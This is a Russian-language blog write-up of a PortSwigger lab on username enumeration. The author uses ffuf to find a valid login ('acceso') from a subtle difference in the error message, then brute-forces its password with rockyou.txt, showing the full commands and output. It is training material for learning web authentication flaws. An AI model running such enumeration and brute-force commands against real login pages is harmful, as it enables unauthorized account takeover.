---
title: "Username enumeration via subtly different responses"
date: 2025-09-04
tags: [web, authentication, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/password-based-vulnerabilities/authentication/password-based/lab-username-enumeration-via-subtly-different-responses"
classes: wide
---

Для решения лабы нужно подобрать логин и пароль для входа в учетку.

```
https://0ac6002303ea13c48074d54e00c50004.web-security-academy.net/
```

## Solution

Зайду на страницу `/login`, чтобы получить запрос для ввода логина и пароля:

```http
POST /login HTTP/2
Host: 0ac6002303ea13c48074d54e00c50004.web-security-academy.net
Cookie: session=VZ67ErbMsIGeje6aI7qdOTeQPT4kFQmu
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ac6002303ea13c48074d54e00c50004.web-security-academy.net/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: https://0ac6002303ea13c48074d54e00c50004.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=123&password=123
```

Попробую перебрать логины из [списка](https://portswigger.net/web-security/authentication/auth-lab-usernames) с сайта `portswigger` с помощью [`ffuf`](https://cu63.github.io/tools/ffuf/):

```bash
cu63:~/ $ ffuf -u https://0ac6002303ea13c48074d54e00c50004.web-security-academy.net/login -X POST -d "username=FUZZ&password=123" -w ~/wordlists/portswigger_logins      
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : https://0ac6002303ea13c48074d54e00c50004.web-security-academy.net/login
 :: Wordlist         : FUZZ: /Users/cu63/wordlists/portswigger_logins
 :: Data             : username=FUZZ&password=123
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

pi                      [Status: 200, Size: 3249, Words: 1328, Lines: 66, Duration: 75ms]
administrador           [Status: 200, Size: 3250, Words: 1328, Lines: 66, Duration: 82ms]
af                      [Status: 200, Size: 3252, Words: 1328, Lines: 66, Duration: 82ms]
ads                     [Status: 200, Size: 3233, Words: 1319, Lines: 65, Duration: 82ms]
ad                      [Status: 200, Size: 3235, Words: 1319, Lines: 65, Duration: 83ms]
ec2-user                [Status: 200, Size: 3252, Words: 1328, Lines: 66, Duration: 124ms]
ae                      [Status: 200, Size: 3250, Words: 1328, Lines: 66, Duration: 84ms]
info                    [Status: 200, Size: 3235, Words: 1319, Lines: 65, Duration: 127ms]
access                  [Status: 200, Size: 3249, Words: 1328, Lines: 66, Duration: 126ms]
acceso                  [Status: 200, Size: 3250, Words: 1329, Lines: 66, Duration: 126ms]
accounting              [Status: 200, Size: 3235, Words: 1319, Lines: 65, Duration: 80ms]
ftp                     [Status: 200, Size: 3249, Words: 1328, Lines: 66, Duration: 127ms]
activestat              [Status: 200, Size: 3249, Words: 1328, Lines: 66, Duration: 131ms]
ansible                 [Status: 200, Size: 3235, Words: 1319, Lines: 65, Duration: 131ms]
test                    [Status: 200, Size: 3232, Words: 1319, Lines: 65, Duration: 126ms]
guest                   [Status: 200, Size: 3249, Words: 1328, Lines: 66, Duration: 126ms]
acid                    [Status: 200, Size: 3252, Words: 1328, Lines: 66, Duration: 132ms]
vagrant                 [Status: 200, Size: 3232, Words: 1319, Lines: 65, Duration: 132ms]
carlos                  [Status: 200, Size: 3235, Words: 1319, Lines: 65, Duration: 131ms]
root                    [Status: 200, Size: 3248, Words: 1328, Lines: 66, Duration: 134ms]
user                    [Status: 200, Size: 3234, Words: 1319, Lines: 65, Duration: 133ms]
adm                     [Status: 200, Size: 3248, Words: 1328, Lines: 66, Duration: 62ms]
adam                    [Status: 200, Size: 3250, Words: 1328, Lines: 66, Duration: 73ms]
oracle                  [Status: 200, Size: 3252, Words: 1328, Lines: 66, Duration: 73ms]
afiliados               [Status: 200, Size: 3248, Words: 1328, Lines: 66, Duration: 61ms]
administracion          [Status: 200, Size: 3234, Words: 1319, Lines: 65, Duration: 89ms]
adsl                    [Status: 200, Size: 3252, Words: 1328, Lines: 66, Duration: 85ms]
agenda                  [Status: 200, Size: 3234, Words: 1319, Lines: 65, Duration: 94ms]
affiliates              [Status: 200, Size: 3233, Words: 1319, Lines: 65, Duration: 93ms]
mysql                   [Status: 200, Size: 3231, Words: 1319, Lines: 65, Duration: 83ms]
administrators          [Status: 200, Size: 3233, Words: 1319, Lines: 65, Duration: 88ms]
ai                      [Status: 200, Size: 3248, Words: 1328, Lines: 66, Duration: 111ms]
ajax                    [Status: 200, Size: 3248, Words: 1328, Lines: 66, Duration: 103ms]
alaska                  [Status: 200, Size: 3251, Words: 1328, Lines: 66, Duration: 101ms]
al                      [Status: 200, Size: 3234, Words: 1319, Lines: 65, Duration: 105ms]
alabama                 [Status: 200, Size: 3235, Words: 1319, Lines: 65, Duration: 108ms]
amarillo                [Status: 200, Size: 3248, Words: 1328, Lines: 66, Duration: 106ms]
ak                      [Status: 200, Size: 3232, Words: 1319, Lines: 65, Duration: 104ms]
akamai                  [Status: 200, Size: 3252, Words: 1328, Lines: 66, Duration: 111ms]
aix                     [Status: 200, Size: 3252, Words: 1328, Lines: 66, Duration: 104ms]
alpha                   [Status: 200, Size: 3235, Words: 1319, Lines: 65, Duration: 104ms]
alterwind               [Status: 200, Size: 3250, Words: 1328, Lines: 66, Duration: 108ms]
ag                      [Status: 200, Size: 3235, Words: 1319, Lines: 65, Duration: 64ms]
announce                [Status: 200, Size: 3250, Words: 1328, Lines: 66, Duration: 74ms]
announcements           [Status: 200, Size: 3233, Words: 1319, Lines: 65, Duration: 63ms]
antivirus               [Status: 200, Size: 3251, Words: 1328, Lines: 66, Duration: 65ms]
ap                      [Status: 200, Size: 3250, Words: 1328, Lines: 66, Duration: 64ms]
apollo                  [Status: 200, Size: 3233, Words: 1319, Lines: 65, Duration: 64ms]
ar                      [Status: 200, Size: 3249, Words: 1328, Lines: 66, Duration: 78ms]
app01                   [Status: 200, Size: 3249, Words: 1328, Lines: 66, Duration: 83ms]
analyzer                [Status: 200, Size: 3249, Words: 1328, Lines: 66, Duration: 62ms]
anaheim                 [Status: 200, Size: 3251, Words: 1328, Lines: 66, Duration: 65ms]
argentina               [Status: 200, Size: 3250, Words: 1328, Lines: 66, Duration: 62ms]
arizona                 [Status: 200, Size: 3231, Words: 1319, Lines: 65, Duration: 77ms]
ao                      [Status: 200, Size: 3249, Words: 1328, Lines: 66, Duration: 65ms]
arlington               [Status: 200, Size: 3232, Words: 1319, Lines: 65, Duration: 66ms]
as400                   [Status: 200, Size: 3250, Words: 1328, Lines: 66, Duration: 72ms]
as                      [Status: 200, Size: 3234, Words: 1319, Lines: 65, Duration: 73ms]
application             [Status: 200, Size: 3232, Words: 1319, Lines: 65, Duration: 94ms]
applications            [Status: 200, Size: 3235, Words: 1319, Lines: 65, Duration: 79ms]
app1                    [Status: 200, Size: 3249, Words: 1328, Lines: 66, Duration: 90ms]
archie                  [Status: 200, Size: 3232, Words: 1319, Lines: 65, Duration: 98ms]
asterix                 [Status: 200, Size: 3251, Words: 1328, Lines: 66, Duration: 66ms]
at                      [Status: 200, Size: 3251, Words: 1328, Lines: 66, Duration: 63ms]
athena                  [Status: 200, Size: 3248, Words: 1328, Lines: 66, Duration: 63ms]
arkansas                [Status: 200, Size: 3234, Words: 1319, Lines: 65, Duration: 67ms]
atlanta                 [Status: 200, Size: 3232, Words: 1319, Lines: 65, Duration: 64ms]
admins                  [Status: 200, Size: 3251, Words: 1328, Lines: 66, Duration: 64ms]
puppet                  [Status: 200, Size: 3251, Words: 1328, Lines: 66, Duration: 66ms]
atlas                   [Status: 200, Size: 3250, Words: 1328, Lines: 66, Duration: 81ms]
adserver                [Status: 200, Size: 3232, Words: 1319, Lines: 65, Duration: 92ms]
academico               [Status: 200, Size: 3251, Words: 1328, Lines: 66, Duration: 101ms]
admin                   [Status: 200, Size: 3249, Words: 1328, Lines: 66, Duration: 97ms]
austin                  [Status: 200, Size: 3233, Words: 1319, Lines: 65, Duration: 61ms]
auction                 [Status: 200, Size: 3234, Words: 1319, Lines: 65, Duration: 63ms]
affiliate               [Status: 200, Size: 3249, Words: 1328, Lines: 66, Duration: 65ms]
auto                    [Status: 200, Size: 3235, Words: 1319, Lines: 65, Duration: 70ms]
autodiscover            [Status: 200, Size: 3251, Words: 1328, Lines: 66, Duration: 85ms]
auth                    [Status: 200, Size: 3251, Words: 1328, Lines: 66, Duration: 99ms]
asia                    [Status: 200, Size: 3251, Words: 1328, Lines: 66, Duration: 86ms]
att                     [Status: 200, Size: 3248, Words: 1328, Lines: 66, Duration: 64ms]
au                      [Status: 200, Size: 3232, Words: 1319, Lines: 65, Duration: 63ms]
agent                   [Status: 200, Size: 3249, Words: 1328, Lines: 66, Duration: 63ms]
an                      [Status: 200, Size: 3252, Words: 1328, Lines: 66, Duration: 62ms]
alerts                  [Status: 200, Size: 3234, Words: 1319, Lines: 65, Duration: 67ms]
americas                [Status: 200, Size: 3252, Words: 1328, Lines: 66, Duration: 65ms]
albuquerque             [Status: 200, Size: 3234, Words: 1319, Lines: 65, Duration: 74ms]
apache                  [Status: 200, Size: 3249, Words: 1328, Lines: 66, Duration: 73ms]
am                      [Status: 200, Size: 3249, Words: 1328, Lines: 66, Duration: 78ms]
app                     [Status: 200, Size: 3235, Words: 1319, Lines: 65, Duration: 74ms]
arcsight                [Status: 200, Size: 3251, Words: 1328, Lines: 66, Duration: 66ms]
apps                    [Status: 200, Size: 3231, Words: 1319, Lines: 65, Duration: 76ms]
apple                   [Status: 200, Size: 3233, Words: 1319, Lines: 65, Duration: 79ms]
appserver               [Status: 200, Size: 3235, Words: 1319, Lines: 65, Duration: 65ms]
aq                      [Status: 200, Size: 3248, Words: 1328, Lines: 66, Duration: 63ms]
adkit                   [Status: 200, Size: 3252, Words: 1328, Lines: 66, Duration: 68ms]
accounts                [Status: 200, Size: 3234, Words: 1319, Lines: 65, Duration: 66ms]
admin                   [Status: 200, Size: 3248, Words: 1328, Lines: 66, Duration: 70ms]
azureuser               [Status: 200, Size: 3231, Words: 1319, Lines: 65, Duration: 91ms]
administrator           [Status: 200, Size: 3231, Words: 1319, Lines: 65, Duration: 103ms]
administrator           [Status: 200, Size: 3232, Words: 1319, Lines: 65, Duration: 65ms]
```

Видно, что у всех ответов разная длина, а все из-за вот этой строчки:

```js
fetch('/analytics?id=709511646427')
```

Попробую отфильтровать ответы по строке ошибки `Invalid username or password.`:

```bash
cu63:~/ $ ffuf -u https://0ac6002303ea13c48074d54e00c50004.web-security-academy.net/login -X POST -d "username=FUZZ&password=123" -w ~/wordlists/portswigger_logins -fr "Invalid username or password\."

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : https://0ac6002303ea13c48074d54e00c50004.web-security-academy.net/login
 :: Wordlist         : FUZZ: /Users/cu63/wordlists/portswigger_logins
 :: Data             : username=FUZZ&password=123
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Invalid username or password\.
________________________________________________

acceso                  [Status: 200, Size: 3231, Words: 1320, Lines: 65, Duration: 67ms]
:: Progress: [101/101] :: Job [1/1] :: 45 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

Такс, нашел `acceso`. Для данного логина ошибка сообщения выглядит следующим образом: `'Invalid username or password '`. Завершающим символом является пробел, а не точка. Теперь переберу пароли:

```bash
cu63:~/ $ ffuf -u https://0ac6002303ea13c48074d54e00c50004.web-security-academy.net/login -X POST -d "username=acceso&password=FUZZ" -w ~/wordlists/rockyou.txt  -fr "username or password."

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : https://0ac6002303ea13c48074d54e00c50004.web-security-academy.net/login
 :: Wordlist         : FUZZ: /Users/cu63/wordlists/rockyou.txt
 :: Data             : username=acceso&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: username or password.
________________________________________________

654321                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 75ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Я нашел пару логин:пароль `acceso`:`654321`. Попробую зайти в лк:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Username_enumeration_via_subtly_different_responses/1.png){: height="200" .align-center}